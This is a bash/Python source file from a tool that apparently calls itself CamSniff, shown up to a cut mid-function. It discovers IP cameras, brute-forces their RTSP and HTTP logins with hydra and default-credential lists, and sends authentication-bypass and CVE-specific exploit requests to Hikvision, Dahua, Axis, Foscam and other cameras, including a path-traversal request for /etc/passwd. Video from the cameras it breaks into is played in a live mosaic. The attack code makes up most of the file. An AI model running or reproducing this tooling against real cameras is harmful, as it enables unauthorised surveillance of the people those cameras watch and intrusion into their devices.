#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

# Scanning and analysis functions

# Defensive array declarations (in case sourced before main launcher declares them)
declare -p CAMERAS_FOUND >/dev/null 2>&1 || declare -A CAMERAS_FOUND
declare -p DEVICE_INFO   >/dev/null 2>&1 || declare -A DEVICE_INFO
declare -p STREAMS       >/dev/null 2>&1 || declare -A STREAMS

# Safe counter to avoid unbound variable errors with set -u and pipefail
safe_count(){
  local name="$1"
  if declare -p "$name" 2>/dev/null | grep -q 'declare \\-A'; then
    eval "echo \\\"\\${#${name}[@]}\\\""
  else
    echo 0
  fi
}

# Interactive camera decision prompt (called after each discovery when INTERACTIVE_MODE=1)
interactive_camera_prompt() {
  local ip="$1" port="$2" proto="$3" url="$4"
  # Skip if not interactive or not a tty
  if [[ "${INTERACTIVE_MODE:-0}" -ne 1 || ! -t 1 ]]; then
    return 0
  fi
  local cam_count dev_count stream_count
  cam_count=$( (declare -p CAMERAS_FOUND 2>/dev/null | grep -q 'declare -A') && echo ${#CAMERAS_FOUND[@]} || echo 0 )
  dev_count=$( (declare -p DEVICE_INFO 2>/dev/null | grep -q 'declare -A') && echo ${#DEVICE_INFO[@]} || echo 0 )
  stream_count=$( (declare -p STREAMS 2>/dev/null | grep -q 'declare -A') && echo ${#STREAMS[@]} || echo 0 )
  echo
  echo -e "\033[33m[INTERACTIVE] New camera: $ip:$port ($proto)\033[0m"
  echo "URL: $url"
  echo "Cameras so far: ${cam_count} | Devices: ${dev_count} | Streams: ${stream_count}"
  echo "Options: [B]rute force now  [V]uln deep check  [D]etails  [Y] continue scanning  E[x]it"
  local choice
  while true; do
    read -r -t 45 -p "Choice (B/V/D/Y/X): " choice || { echo; break; }
    case "$choice" in
      [Bb])
        echo "Launching targeted brute force (HTTP+RTSP if applicable)...";
        ENABLE_BRUTE_FORCE=1
        # Try HTTP brute force if port 80/8080/8000 etc previously scanned
        if [[ "$proto" == http* || "$url" == http* ]]; then
          scan_http "$ip" "${port}" || true
        fi
        if [[ "$proto" == rtsp* || "$url" == rtsp* ]]; then
          scan_rtsp "$ip" "${port}" || true
        fi
        break ;;
      [Vv])
        echo "Running deep vendor vuln checks + CVE quick search...";
        # Re-run header fingerprint to trigger brand checks + CVE again
        scan_http "$ip" "${port}" || true
        break ;;
      [Dd])
        echo "--- Camera Details ---"
        echo "IP: $ip"; echo "Port: $port"; echo "Protocol: $proto"; echo "URL: $url"
        # Show any device info captured
        if [[ -n "${DEVICE_INFO[$ip]:-}" ]]; then
          IFS='|' read -r dtype dinfo <<< "${DEVICE_INFO[$ip]}"
          echo "Device Type: $dtype"
          echo "Info: $dinfo"
        else
          echo "No extra device info captured yet."
        fi
        echo "----------------------";
        ;; # stay in loop for next action
      [Yy])
        echo "Continuing scan..."; break ;;
      [Xx])
        echo "User requested exit."; exit 0 ;;
      *) echo "Enter B, V, D, Y or X" ;;
    esac
  done
}

# Phase helper for consistent phase banners
phase(){
  local name="$1"; shift || true
  if [[ -t 1 ]]; then
    echo -e "\n\033[36m=== PHASE: ${name} ===\033[0m"
  else
    echo "=== PHASE: ${name} ==="
  fi
  if [[ -n "${*:-}" ]]; then
    echo "$*"
  fi
  # Mark phase active (used to temporarily suppress animations during banner output)
  PHASE_ACTIVE=1
  # Briefly sleep to avoid overlap with spinner output when phases change
  sleep 0.05
}

interim_summary(){
  local cam_count dev_count stream_count
  cam_count=$(safe_count CAMERAS_FOUND)
  dev_count=$(safe_count DEVICE_INFO)
  stream_count=$(safe_count STREAMS)
  echo "[SUMMARY] Cameras=${cam_count} Devices=${dev_count} Streams=${stream_count}"
}

# Function to run plugins
run_plugins(){
  mkdir -p plugins
  for f in plugins/*.sh; do [[ -x $f ]] && bash "$f" & done
  for p in plugins/*.py; do [[ -x $p ]] && python3 "$p" & done
}

# Function to add stream with  tracking
add_stream(){ 
  if (( $(safe_count STREAMS) < MAX_STREAMS )); then
    STREAMS["$1"]=1
    # Extract IP and port for tracking
    local url="$1"
    local ip
    local port
    ip=$(echo "$url" | sed -n 's|.*://\([^:/]*\).*|\1|p')
    port=$(echo "$url" | sed -n 's|.*:\([0-9]*\)/.*|\1|p')
    [[ -z "$port" ]] && port="554"  # Default RTSP port
    
    # Determine protocol
    local protocol
    protocol=$(echo "$url" | sed -n 's|\([^:]*\)://.*|\1|p')
    
    log_camera_found "$ip" "$port" "$protocol" "$url"
  fi
}

# Function to launch mosaic with  display
launch_mosaic(){
  (( $(safe_count STREAMS) )) || return
  
  log "Preparing  mosaic display for ${#STREAMS[@]} camera(s)..."
  
  # Create camera info overlay
  local info_file="$OUTPUT_DIR/reports/mosaic_info.txt"
  {
  CAMSNIFF_VERSION=${CAMSNIFF_VERSION:-$(cat "$(dirname "$SCRIPT_DIR")/VERSION" 2>/dev/null || echo "dev")}
    echo "CamSniff ${CAMSNIFF_VERSION} - Live Camera Mosaic"
    echo "Cameras Active: ${#STREAMS[@]}"
    echo "Scan Time: $(date)"
    echo "================================"
    
    local i=1
    for u in "${!STREAMS[@]:-}"; do
      local ip
      local protocol
      ip=$(echo "$u" | sed -n 's|.*://\([^:/]*\).*|\1|p')
      protocol=$(echo "$u" | sed -n 's|\([^:]*\)://.*|\1|p')
      echo "[$i] $ip ($protocol)"
      ((i++))
    done
  } > "$info_file"
  
  # Calculate optimal grid layout
  local stream_count=$(safe_count STREAMS)
  local cols=2 rows=2
  case $stream_count in
    1) cols=1 rows=1 ;;
    2) cols=2 rows=1 ;;
    3|4) cols=2 rows=2 ;;
    5|6) cols=3 rows=2 ;;
    7|8|9) cols=3 rows=3 ;;
    *) cols=4 rows=4 ;;
  esac
  
  # Prepare inputs for ffmpeg
  inputs=()
  for u in "${!STREAMS[@]:-}"; do
    inputs+=(-i "$u")
  done
  
  #  mosaic with overlay
  log "Starting mosaic display (${cols}x${rows} grid)..."
  
  # Create the mosaic layout
  if (( ${#inputs[@]} > 2 )); then
    ffmpeg "${inputs[@]}" \
      -filter_complex "xstack=inputs=${#STREAMS[@]:-0}:layout=0_0|w0_0|0_h0|w0_h0[mosaic];[mosaic]drawtext=fontsize=20:fontcolor=white:box=1:boxcolor=black@0.5:text='CamSniff Live Feed - ${#STREAMS[@]} Cameras':x=10:y=10[out]" \
      -map "[out]" -f matroska - 2>/dev/null | ffplay -window_title "CamSniff  Mosaic" -loglevel error - &
  else
    # Simple display for 1-2 cameras: expand keys safely
    urls=()
    for k in "${!STREAMS[@]:-}"; do urls+=("$k"); done
    ffplay -window_title "CamSniff Camera Feed" -loglevel error "${urls[@]}" &
  fi
  
  local mosaic_pid=$!
  log "Mosaic started (PID: $mosaic_pid). Press Ctrl+C to stop."

  # Save active mosaic info
  mkdir -p "$OUTPUT_DIR"
  echo "$mosaic_pid" > "$OUTPUT_DIR/mosaic.pid"

  # Reset STREAMS map safely
  unset STREAMS
  declare -A STREAMS
}

# Function to take screenshot and analyze
screenshot_and_analyze(){
  u=$1
  ip=${u#*://}
  ip=${ip%%[:/]*}
  out="$OUTPUT_DIR/screenshots/snap_${ip}_$(date +%H%M%S).jpg"
  
  ffmpeg -rtsp_transport tcp -i "$u" -frames:v 1 -q:v 2 -y "$out" &>/dev/null && {
    log "[SNAP] $u → $out"
    # Updated path to python_core
    if [[ -f "$SCRIPT_DIR/python_core/ai_analyze.py" ]]; then
      python3 "$SCRIPT_DIR/python_core/ai_analyze.py" "$out" "$ip" "$OUTPUT_DIR/reports/alerts.log" "$OUTPUT_DIR/reports/analysis_${ip}.json" 2>/dev/null || true
    fi
  }
}

#  CVE checking function using local CVE data
cve_check() {
  local search_term="$1"
  log_debug "Starting CVE check for: $search_term"
  
  # Skip empty or very short search terms
  if [[ ${#search_term} -lt 3 ]]; then
    log_debug "Search term too short, skipping CVE check"
    return
  fi
  
  # Prefer local quick search first; fallback to hardcoded hints
  cve_quick_search "$search_term"
}

# Quick CVE search using GitHub search API (faster alternative)
cve_quick_search() {
  local search_term="$1"
  log_debug "Quick CVE search for: $search_term"
  
  local results
  if [[ -f "$SCRIPT_DIR/python_core/cve_quick_search.py" ]]; then
    results=$(python3 "$SCRIPT_DIR/python_core/cve_quick_search.py" "$search_term" 2>/dev/null || true)
  else
    results=""
  fi
  if [[ -n "$results" ]]; then
    while IFS= read -r line; do
      [[ -n "$line" ]] && log "$line"
    done <<< "$results"
  else
    log_debug "No local CVE matches found, using fallback check"
    cve_fallback_check "$search_term"
  fi
}

# Fallback CVE check using local wordlist (when GitHub API is unavailable)
cve_fallback_check() {
  local search_term="$1"
  log_debug "Using fallback CVE check for: $search_term"
  
  # Create a simple local CVE knowledge base for common camera vulnerabilities
  python3 - <<FALLBACK_CVE 2>/dev/null
search_term = "$search_term".lower()

# Common camera-related CVEs (hardcoded fallback list)
known_cves = {
    "hikvision": [
        "CVE-2017-7921: Hikvision IP cameras allow unauthenticated access",
        "CVE-2021-36260: Hikvision multiple products command injection",
        "CVE-2023-28808: Hikvision security access control vulnerability"
    ],
    "dahua": [
        "CVE-2017-7927: Dahua IP cameras authentication bypass",
        "CVE-2021-33044: Dahua cameras authentication bypass vulnerability",
        "CVE-2022-30560: Dahua network cameras command injection"
    ],
    "axis": [
        "CVE-2018-10660: Axis Communications products denial of service",
        "CVE-2022-4487: Axis network cameras authentication bypass",
        "CVE-2023-21407: Axis products remote code execution"
    ],
    "foscam": [
        "CVE-2017-2791: Foscam IP cameras multiple vulnerabilities",
        "CVE-2020-9311: Foscam cameras authentication bypass",
        "CVE-2021-32934: Foscam cameras buffer overflow vulnerability"
    ],
    "vivotek": [
        "CVE-2018-11650: Vivotek cameras authentication bypass",
        "CVE-2019-11612: Vivotek network cameras command injection",
        "CVE-2020-25785: Vivotek cameras remote code execution"
    ]
}

# Search for matching vendors
for vendor, cves in known_cves.items():
    if vendor in search_term:
        for cve in cves[:2]:  # Limit to 2 results
            print(f"[CVE-FALLBACK] {cve}")
        break
else:
    # Generic camera CVE warnings
    if any(word in search_term for word in ["camera", "ip", "webcam", "dvr", "nvr"]):
        print("[CVE-FALLBACK] CVE-2021-32934: Generic IP camera authentication vulnerabilities")
        print("[CVE-FALLBACK] CVE-2020-25785: Network cameras remote access vulnerabilities")

FALLBACK_CVE
}

#  ONVIF discovery
discover_onvif(){
  log_debug "Starting  ONVIF discovery"
  python3 - <<PY 2>/dev/null
import socket
import time
import xml.etree.ElementTree as ET
import re

# WS-Discovery probe message for ONVIF cameras
probe_msg = '''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:tns="http://schemas.xmlsoap.org/ws/2005/04/discovery">
    <soap:Header>
        <wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action>
        <wsa:MessageID>urn:uuid:0a6dc791-2be6-4991-9af1-454778a1917a</wsa:MessageID>
        <wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To>
    </soap:Header>
    <soap:Body>
        <tns:Probe>
            <tns:Types>dn:NetworkVideoTransmitter</tns:Types>
        </tns:Probe>
    </soap:Body>
</soap:Envelope>'''

try:
    # Create UDP socket for multicast
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    
    # Send probe to ONVIF multicast address
    sock.sendto(probe_msg.encode(), ('239.255.255.250', 3702))
    
    cameras_found = 0
    while cameras_found < 10:  # Limit responses
        try:
            response, addr = sock.recvfrom(4096)
            response_text = response.decode('utf-8', errors='ignore')
            
            # Extract device information
            ip = addr[0]
            
            # Try to extract device service URL
            url_match = re.search(r'http://([^/]+)/onvif/device_service', response_text)
            if url_match:
                device_url = f"http://{url_match.group(1)}/onvif/device_service"
                print(f"[ONVIF] Camera found at {ip} - {device_url}")
                
                # Try to extract manufacturer info
                if 'hikvision' in response_text.lower():
                    print(f"[ONVIF] Hikvision camera detected at {ip}")
                elif 'dahua' in response_text.lower():
                    print(f"[ONVIF] Dahua camera detected at {ip}")
                elif 'axis' in response_text.lower():
                    print(f"[ONVIF] Axis camera detected at {ip}")
                else:
                    print(f"[ONVIF] Unknown ONVIF camera at {ip}")
                    
                cameras_found += 1
            
        except socket.timeout:
            break
        except Exception as e:
            break
    
    sock.close()
    print(f"[ONVIF] Discovery complete - {cameras_found} cameras found")
    
except Exception as e:
    print(f"[ONVIF] Discovery failed: {e}")
PY
}

# Function to discover SSDP
discover_ssdp(){
  echo -ne 'M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:urn:schemas-upnp-org:device:Basic:1\r\nMAN:"ssdp:discover"\r\nMX:2\r\n\r\n' \
    | nc -u -w2 239.255.255.250 1900 | grep -i LOCATION | head -5 | sed 's/^/ [SSDP] /'
}

# Function to scan HLS
scan_hls(){ for p in live index stream playlist master; do
  url="http://$1:$2/$p.m3u8"
  curl -sfI "$url" | grep -qi 'application/vnd.apple.mpegurl' && { log "[HLS] $url"; add_stream "$url"; return; }
done }

# Function to scan RTSP ( for aggressive scanning)
scan_rtsp(){
  log_debug "Starting  RTSP scan for $1:$2"
  local ip="$1" port="$2" found=0
  
  # Test common RTSP paths first
  local common_paths=(
    "rtsp://$ip:$port/video"
    "rtsp://$ip:$port/cam"
    "rtsp://$ip:$port/stream"
    "rtsp://$ip:$port/live"
    "rtsp://$ip:$port/h264"
    "rtsp://$ip:$port/mpeg4"
    "rtsp://$ip:$port/mjpeg"
    "rtsp://$ip:$port/1"
    "rtsp://$ip:$port/0"
    "rtsp://admin:admin@$ip:$port/cam/realmonitor?channel=1&subtype=0"
  )
  
  for u in "${common_paths[@]}"; do
    log_debug "Testing common RTSP URL: $u"
    if ffprobe -v quiet -rtsp_transport tcp -timeout 2000000 -i "$u" 2>&1 | grep -q "Video:"; then
      log "[RTSP] $u"
      add_stream "$u"
      found=1
      
      # Try to get device info via RTSP DESCRIBE
      rtsp_info=$(ffprobe -v quiet -show_format -i "$u" 2>/dev/null | grep -E "(TAG:|server)" || echo "Unknown device")
      log_device_info "$ip" "$rtsp_info" "camera"
      break
    fi
  done
  
  # If no common paths worked, try the  list
  if (( !found )); then
    log_debug "Testing  RTSP paths for $ip:$port"
    for rtsp_path in "${RTSP_PATHS[@]:0:20}"; do  # Limit to first 20 for speed
      # Replace placeholders in the RTSP path
      u=$(echo "$rtsp_path" | sed "s/{{username}}/admin/g; s/{{password}}/admin/g; s/{{ip_address}}/$ip/g; s/{{port}}/$port/g")
      log_debug "Testing RTSP URL: $u"
      
      if ffprobe -v quiet -rtsp_transport tcp -timeout 1000000 -i "$u" 2>&1 | grep -q "Video:"; then
        log "[RTSP] $u"
        add_stream "$u"
        found=1
        break
      fi
    done
  fi

  #  brute-force if no stream found (guarded by ENABLE_BRUTE_FORCE)
  if (( !found )) && [[ "${ENABLE_BRUTE_FORCE:-0}" -eq 1 ]]; then
    log_debug "Starting RTSP brute-force for $ip:$port"
    # Use dedicated user/password lists if available
    local users_file="${HYDRA_USER_FILE:-}"
    local pass_file="${HYDRA_PASS_FILE:-}"
    if [[ -z "$users_file" || -z "$pass_file" || ! -s "$users_file" || ! -s "$pass_file" ]]; then
      # Use  wordlists if available
      users_file="/tmp/.camsniff_users.txt"; pass_file="/tmp/.camsniff_passwords.txt"
      
      # Load usernames from wordlist or use fallback
      if [[ -n "$USERNAME_WORDLIST" && -f "$SCRIPT_DIR/$USERNAME_WORDLIST" ]]; then
        # Filter out empty username marker and copy to temp file
        grep -v "^__EMPTY__$" "$SCRIPT_DIR/$USERNAME_WORDLIST" > "$users_file" 2>/dev/null || true
        # Add empty username if it was in the original list
        grep -q "^__EMPTY__$" "$SCRIPT_DIR/$USERNAME_WORDLIST" 2>/dev/null && echo "" >> "$users_file"
      else
        printf "%s\n" admin root user guest >"$users_file" 2>/dev/null || true
      fi
      
      # Load passwords from wordlist or use fallback  
      if [[ -n "$PASSWORD_WORDLIST" && -f "$SCRIPT_DIR/$PASSWORD_WORDLIST" ]]; then
        # Filter out empty password marker and copy to temp file
        grep -v "^__EMPTY__$" "$SCRIPT_DIR/$PASSWORD_WORDLIST" > "$pass_file" 2>/dev/null || true
        # Add empty password if it was in the original list
        grep -q "^__EMPTY__$" "$SCRIPT_DIR/$PASSWORD_WORDLIST" 2>/dev/null && echo "" >> "$pass_file"
      else
        printf "%s\n" admin 12345 123456 password root guest >"$pass_file" 2>/dev/null || true
      fi
    fi
    hydra -L "$users_file" -P "$pass_file" -s "$port" "$ip" rtsp -t "$HYDRA_RATE" &>/dev/null && {
      log "[HYDRA-RTSP] $ip:$port - Credentials found"
      log_device_info "$ip" "RTSP credentials discovered" "camera"
    }
  fi
}

# Revolutionary credential bypass function
advanced_credential_bypass() {
  local ip="$1" port="$2"
  log_debug "Starting advanced credential bypass on $ip:$port"
  
  # Common vulnerable paths that bypass authentication
  local bypass_paths=(
    "/cgi-bin/authBypass"
    "/config/getuser?index=0"
    "/system.ini?loginuse&loginpas"
    "/get_status.cgi"
    "/system.cgi?loginuse&loginpas"
    "/setup/setup_capture.php?user=admin&pass="
    "/cgi-bin/hi3510/param.cgi?cmd=getuser"
    "/onvif/device_service"
    "/rtsp_over_http/"
    "/cgi-bin/cgiclient.cgi?action=login&user=service&password=service"
    "/web/cgi-bin/hi3510/param.cgi?cmd=getuser&user=admin"
    "/cgi-bin/net_jpeg.cgi"
    "/axis-cgi/mjpg/video.cgi"
    "/cgi-bin/snapshot.cgi"
    "/cgi-bin/setup.cgi"
  )
  
  for path in "${bypass_paths[@]}"; do
    response=$(curl -sI "http://$ip:$port$path" -m 3 2>/dev/null)
    if echo "$response" | grep -q "200 OK\|302 Found\|multipart/x-mixed-replace"; then
      log "[BYPASS-AUTH] $ip:$port$path - Authentication bypassed!"
      log_device_info "$ip" "Authentication bypass: $path" "vulnerable_camera"
      add_stream "http://$ip:$port$path"
    fi
  done
  
  # Default credential attempts with URL encoding bypasses
  local default_creds=(
    "admin:"
    "admin:admin" 
    "admin:12345"
    "admin:password"
    "root:root"
    "service:service"
    "tech:tech"
    "guest:guest"
    "user:user"
    "viewer:viewer"
    ":"
    "admin:123456"
    "admin:admin123"
    "admin:000000"
    "admin:1111"
    "admin:camera"
    "camera:camera"
  )
  
  # Try bypasses with various encoding tricks
  for cred in "${default_creds[@]}"; do
    IFS=: read -r user pass <<< "$cred"
    
    # Standard authentication
    response=$(curl -su "$user:$pass" -I "http://$ip:$port/" -m 2 2>/dev/null)
    if echo "$response" | grep -q "200 OK"; then
      log "[CRED-BYPASS] $ip:$port - Credentials: $user:$pass"
      log_device_info "$ip" "Default credentials: $user:$pass" "vulnerable_camera"
    fi
    
    # URL encoding bypass attempts
    user_encoded=$(printf "%s" "$user" | xxd -p | sed 's/../%&/g')
    pass_encoded=$(printf "%s" "$pass" | xxd -p | sed 's/../%&/g')
    
    response=$(curl -su "$user_encoded:$pass_encoded" -I "http://$ip:$port/" -m 2 2>/dev/null)
    if echo "$response" | grep -q "200 OK"; then
      log "[ENCODING-BYPASS] $ip:$port - URL-encoded credentials: $user:$pass"
      log_device_info "$ip" "URL encoding bypass: $user:$pass" "vulnerable_camera"
    fi
  done
  
  # Cookie-based session bypass
  response=$(curl -s -H "Cookie: PHPSESSID=admin; user=admin; auth=1" "http://$ip:$port/" -m 3 2>/dev/null)
  if echo "$response" | grep -qi "video\|stream\|camera\|mjpeg"; then
    log "[COOKIE-BYPASS] $ip:$port - Session cookie bypass successful"
    log_device_info "$ip" "Cookie authentication bypass" "vulnerable_camera"
  fi
  
  # Common CGI vulnerabilities
  local vuln_cgis=(
    "/cgi-bin/CGIProxy.fcgi"
    "/cgi-bin/viewer.cgi"
    "/cgi-bin/video.cgi"
    "/cgi-bin/mjpg/video.cgi"
    "/cgi-bin/net_jpeg.cgi"
  )
  
  for cgi in "${vuln_cgis[@]}"; do
    response=$(curl -s "http://$ip:$port$cgi" -m 2 2>/dev/null)
    if echo "$response" | grep -qi "boundary\|multipart\|video"; then
      log "[CGI-BYPASS] $ip:$port$cgi - Direct CGI access"
      log_device_info "$ip" "CGI bypass: $cgi" "vulnerable_camera"
      add_stream "http://$ip:$port$cgi"
    fi
  done
}

# Brand-specific vulnerability check functions
check_hikvision_vulns() {
  local ip="$1" port="$2"
  log_debug "Checking Hikvision-specific vulnerabilities on $ip:$port"
  
  # CVE-2017-7921: Backdoor account
  response=$(curl -s "http://$ip:$port/Security/users?auth=YWRtaW46MTEK" -m 3 2>/dev/null)
  if echo "$response" | grep -qi "username\|password"; then
    log "[HIKVISION-CVE-2017-7921] $ip:$port - Backdoor account vulnerability"
    log_device_info "$ip" "CVE-2017-7921: Backdoor account" "critical_vuln"
  fi
  
  # CVE-2021-36260: Command injection
  test_path="/SDK/webLanguage?language=../../../../../../../etc/passwd%00"
  response=$(curl -s "http://$ip:$port$test_path" -m 3 2>/dev/null)
  if echo "$response" | grep -q "root:"; then
    log "[HIKVISION-CVE-2021-36260] $ip:$port - Command injection vulnerability"
    log_device_info "$ip" "CVE-2021-36260: Command injection" "critical_vuln"
  fi
  
  # Check for unauthenticated config access
  config_paths=("/config" "/system.ini" "/davinci.avi")
  for path in "${config_paths[@]}"; do
    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
    if echo "$response" | grep -q "200 OK"; then
      log "[HIKVISION-CONFIG] $ip:$port$path - Unauthenticated config access"
      log_device_info "$ip" "Unauthenticated config: $path" "config_leak"
    fi
  done
}

check_dahua_vulns() {
  local ip="$1" port="$2"
  log_debug "Checking Dahua-specific vulnerabilities on $ip:$port"
  
  # CVE-2021-33044: Authentication bypass
  response=$(curl -s "http://$ip:$port/cgi-bin/magicBox.cgi?action=getSystemInfo" -m 3 2>/dev/null)
  if echo "$response" | grep -qi "serialNumber\|deviceType"; then
    log "[DAHUA-CVE-2021-33044] $ip:$port - Authentication bypass"
    log_device_info "$ip" "CVE-2021-33044: Auth bypass" "critical_vuln"
  fi
  
  # Console access
  console_paths=("/console" "/cgi-bin/main-cgi" "/cgi-bin/setup.cgi")
  for path in "${console_paths[@]}"; do
    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
    if echo "$response" | grep -q "200 OK"; then
      log "[DAHUA-CONSOLE] $ip:$port$path - Console access"
      log_device_info "$ip" "Console access: $path" "admin_access"
    fi
  done
}

check_axis_vulns() {
  local ip="$1" port="$2"
  log_debug "Checking Axis-specific vulnerabilities on $ip:$port"
  
  # CVE-2018-10658: Directory traversal
  test_path="/axis-cgi/param.cgi?action=list&group=root.Image.I0.Appearance"
  response=$(curl -s "http://$ip:$port$test_path" -m 3 2>/dev/null)
  if echo "$response" | grep -qi "root\.Image"; then
    log "[AXIS-CVE-2018-10658] $ip:$port - Directory traversal"
    log_device_info "$ip" "CVE-2018-10658: Directory traversal" "high_vuln"
  fi
  
  # Default admin interface
  admin_paths=("/axis-cgi/admin/param.cgi" "/axis-cgi/mjpg/video.cgi")
  for path in "${admin_paths[@]}"; do
    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
    if echo "$response" | grep -q "200 OK\|multipart"; then
      log "[AXIS-ADMIN] $ip:$port$path - Admin interface access"
      log_device_info "$ip" "Admin interface: $path" "admin_access"
      add_stream "http://$ip:$port$path"
    fi
  done
}

check_vivotek_vulns() {
  local ip="$1" port="$2"
  log_debug "Checking Vivotek-specific vulnerabilities on $ip:$port"
  
  # CVE-2018-11526: Command injection
  test_path="/cgi-bin/viewer/video.jpg?resolution=1&amp;quality=1&amp;Language=0&amp;Obj0=7373&amp;Obj1=7373"
  response=$(curl -s "http://$ip:$port$test_path" -m 3 2>/dev/null)
  if echo "$response" | grep -q "JPEG\|image"; then
    log "[VIVOTEK-CVE-2018-11526] $ip:$port - Potential command injection vector"
    log_device_info "$ip" "CVE-2018-11526: Command injection vector" "high_vuln"
  fi
  
  # Configuration files
  config_paths=("/setup/config.xml" "/cgi-bin/admin/getparam.cgi")
  for path in "${config_paths[@]}"; do
    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
    if echo "$response" | grep -q "200 OK"; then
      log "[VIVOTEK-CONFIG] $ip:$port$path - Configuration access"
      log_device_info "$ip" "Config access: $path" "config_leak"
    fi
  done
}

check_foscam_vulns() {
  local ip="$1" port="$2"
  log_debug "Checking Foscam-specific vulnerabilities on $ip:$port"
  
  # CVE-2017-2861: Credential exposure
  response=$(curl -s "http://$ip:$port/cgi-bin/CGIProxy.fcgi?cmd=getDevInfo" -m 3 2>/dev/null)
  if echo "$response" | grep -qi "username\|password\|devInfo"; then
    log "[FOSCAM-CVE-2017-2861] $ip:$port - Credential exposure"
    log_device_info "$ip" "CVE-2017-2861: Credential exposure" "critical_vuln"
  fi
  
  # Unauthenticated video access
  video_paths=("/cgi-bin/CGIStream.cgi?cmd=GetMJStream" "/video.cgi" "/snapshot.cgi")
  for path in "${video_paths[@]}"; do
    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
    if echo "$response" | grep -q "multipart\|image"; then
      log "[FOSCAM-VIDEO] $ip:$port$path - Unauthenticated video access"
      log_device_info "$ip" "Unauthenticated video: $path" "video_leak"
      add_stream "http://$ip:$port$path"
    fi
  done
}

check_dlink_vulns() {
  local ip="$1" port="$2"
  log_debug "Checking D-Link-specific vulnerabilities on $ip:$port"
  
  # CVE-2019-10999: Information disclosure
  response=$(curl -s "http://$ip:$port/config/getuser?index=0" -m 3 2>/dev/null)
  if echo "$response" | grep -qi "name\|pass"; then
    log "[DLINK-CVE-2019-10999] $ip:$port - Information disclosure"
    log_device_info "$ip" "CVE-2019-10999: Info disclosure" "critical_vuln"
  fi
  
  # Common D-Link paths
  dlink_paths=("/common/info.cgi" "/cgi-bin/view_video.cgi")
  for path in "${dlink_paths[@]}"; do
    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
    if echo "$response" | grep -q "200 OK"; then
      log "[DLINK-ACCESS] $ip:$port$path - D-Link interface access"
      log_device_info "$ip" "D-Link interface: $path" "admin_access"
    fi
  done
}

check_tplink_vulns() {
  local ip="$1" port="$2"
  log_debug "Checking TP-Link-specific vulnerabilities on $ip:$port"
  
  # Check for default credentials and common paths
  tplink_paths=("/stream/video/mjpeg" "/cgi/ptdc.cgi")
  for path in "${tplink_paths[@]}"; do
    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
    if echo "$response" | grep -q "200 OK\|multipart"; then
      log "[TPLINK-ACCESS] $ip:$port$path - TP-Link interface access"
      log_device_info "$ip" "TP-Link interface: $path" "admin_access"
      add_stream "http://$ip:$port$path"
    fi
  done
}

check_sony_vulns() {
  local ip="$1" port="$2"
  log_debug "Checking Sony-specific vulnerabilities on $ip:$port"
  
  # Sony camera specific paths
  sony_paths=("/sony/camera" "/command/camera.cgi")
  for path in "${sony_paths[@]}"; do
    response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
    if echo "$response" | grep -q "200 OK"; then
      log "[SONY-ACCESS] $ip:$port$path - Sony camera interface"
      log_device_info "$ip" "Sony interface: $path" "camera_access"
    fi
  done
}

detect_generic_camera() {
  local ip="$1" port="$2"
  log_debug "Attempting generic camera detection on $ip:$port"
  
  # Generic camera detection patterns
  response=$(curl -s "http://$ip:$port/" -m 3 2>/dev/null)
  
  if echo "$response" | grep -qi "camera\|mjpeg\|rtsp\|onvif\|video"; then
    log "[GENERIC-CAMERA] $ip:$port - Generic camera interface detected"
    log_device_info "$ip" "Generic camera interface" "generic_camera"
    
    # Try common generic paths
    generic_paths=("/video" "/mjpeg" "/stream" "/cam" "/camera")
    for path in "${generic_paths[@]}"; do
      test_response=$(curl -sI "http://$ip:$port$path" -m 2 2>/dev/null)
      if echo "$test_response" | grep -q "multipart\|video\|image"; then
        log "[GENERIC-STREAM] $ip:$port$path - Video stream found"
        add_stream "http://$ip:$port$path"
      fi
    done
  fi
}
 
# Primary HTTP scan routine (encapsulates camera path checks, brute force, brand detection)
scan_http(){
  local ip="$1" port="$2"
  log_debug "Starting HTTP scan for $ip:$port"
  local camera_paths=(
    "/video" "/cam" "/stream" "/live" "/mjpeg" "/cgi-bin/mjpeg"
    "/axis-cgi/mjpg/video.cgi" "/cgi-bin/camera" "/webcam.cgi"
    "/video.cgi" "/snapshot.cgi" "/image.cgi" "/videostream.cgi"
    "/cgi-bin/hi3510/snap.cgi" "/onvif/device_service" "/streaming/channels/1/httppreview"
  )
  
  # Test for camera-specific HTTP endpoints
  for path in "${camera_paths[@]}"; do
    for cred in "${HTTP_CREDS[@]}"; do
      IFS=: read -r u p <<<"$cred"
      url="http://$ip:$port$path"
      
      response=$(curl -su "$u:$p" -m3 -I "$url" 2>/dev/null)
      if echo "$response" | grep -q "multipart/x-mixed-replace\|image/jpeg\|video/"; then
        log "[MJPEG/HTTP] $url ($u:$p)"
        add_stream "$url"
        
        # Get server info for device identification
        server_info=$(echo "$response" | grep -i '^Server:' | cut -d' ' -f2- || echo "Unknown")
        log_device_info "$ip" "HTTP Camera: $server_info" "camera"
        break 2
      fi
    done
  done
  
  # Scan for HLS streams
  scan_hls "$ip" "$port"
  
  # General HTTP brute-force (guarded by ENABLE_BRUTE_FORCE)
  local combo_file="${HYDRA_COMBO_FILE:-}"
  if [[ "${ENABLE_BRUTE_FORCE:-0}" -eq 1 && ( -z "$combo_file" || ! -s "$combo_file" ) ]]; then
    combo_file="/tmp/.camsniff_combos.txt"
    
    # Generate combo file from wordlists if available
    if [[ -n "$USERNAME_WORDLIST" && -f "$SCRIPT_DIR/$USERNAME_WORDLIST" && 
          -n "$PASSWORD_WORDLIST" && -f "$SCRIPT_DIR/$PASSWORD_WORDLIST" ]]; then
      
